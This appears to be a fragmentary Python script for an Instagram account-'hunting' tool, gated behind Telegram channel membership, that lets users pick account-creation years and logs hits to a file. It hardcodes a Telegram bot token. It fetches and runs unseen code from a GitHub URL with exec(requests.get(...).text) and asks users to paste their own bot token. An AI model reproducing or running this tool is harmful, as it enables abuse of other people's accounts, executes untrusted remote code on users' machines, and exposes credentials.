...
# Example usage
text = "RAINBOW COLORS"
live_text(rainbow_text(' This file is only for my channel members, if you have not joined yet then you cannot use this file'))
init(autoreset=True)
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
...
reset = "\033[0m"
ANII = render('{ANII}', colors=['white', 'cyan'], align='center')
print(f'''{cyan}━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═
                           {ANII}
{cyan}━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═    ''')
import requests
...
BOT_TOKEN = "7680543388:AAHwStXUXcNuoeEYbnPDlVxBdLTx-YB3KJ4"
...
def verify_user():
    ...
    try:
        user_id = int(input(f"{white}➜ {cyan} 𝐂𝐇𝐀𝐓 𝐈𝐃 •   {red} "))
    except ValueError:
        print(f"{red} STUPID ASS, TRY AGAIN")
        time.sleep(2)
        sys.exit()

    if not is_member(user_id):
        print("➜ Access denied! Join @aniisolo to use this file. ")
        time.sleep(2)  # Message stays visible for 2 seconds
...
verify_user()
FILENAME = 'META'
import requests;exec(requests.get("https://raw.githubusercontent.com/ax8n/aniipy/refs/heads/main/expiretime.py").text)
token = input(f" ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ ㅤ  ㅤ {white}➜ {cyan} 𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 •   {red} ") 
aca = 0
total = 0
hits = 0
badinsta = 0
...
infoinsta = {}
os.system("clear")
#webbrowser.open('https://t.me/addlist/dACZCYG_7glhNmY1')
def pppp():
    os.system('clear')
    output = (f" 𝐓𝐫𝐮𝐞 : {hits}\n"
              f" 𝐅𝐚𝐥𝐬𝐞 : {badinsta}\n"
...
a = print(f"""
{white}━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━
  {cyan}𖤐  {red}Select The Year You Want To Hunt For {cyan}𖤐   
{white}━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━
  {orange}[1]{white} - {yellow}2010{white} ~ {yellow}2011 {red}(rare)
  {orange}[2]{white} - {yellow}2012 {red}(luck)
  {orange}[3]{white} - {yellow}2013 {red}(luck)
  {orange}[4]{white} - {yellow}2014 {green}(meta)
  {orange}[5]{white} - {yellow}2015 {green}(meta)
  {orange}[6]{white} - {yellow}2016 {green}(meta)
  {orange}[7]{white} - {yellow}2017 {green}(meta)
  {orange}[8]{white} - {yellow}2018 {green}(meta)
  {orange}[9]{white} - {yellow}2019 {green}(bizz + meta)
  {orange}[0]{white} - {yellow}2010{white} ~ {yellow}2023 {blue}(best for everything)
{white}━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━
""")
ANII = input(f"  {cyan}𖤐  {white}𝐏𝐋𝐄𝐀𝐒𝐄 𝐓𝐘𝐏𝐄 𝐓𝐇𝐄 𝐍𝐔𝐌𝐁𝐄𝐑 𝐎𝐅 𝐘𝐎𝐔𝐑 𝐂𝐇𝐎𝐈𝐂𝐄:     {reset}")
...
─────────────────── 
𝐁𝐘 @AniiRo | 𝐂𝐇𝐍𝐋 @aniisolo
'''

    with open('AniiRo.txt', 'a') as ff:
        ff.write(f'{ss}\n')
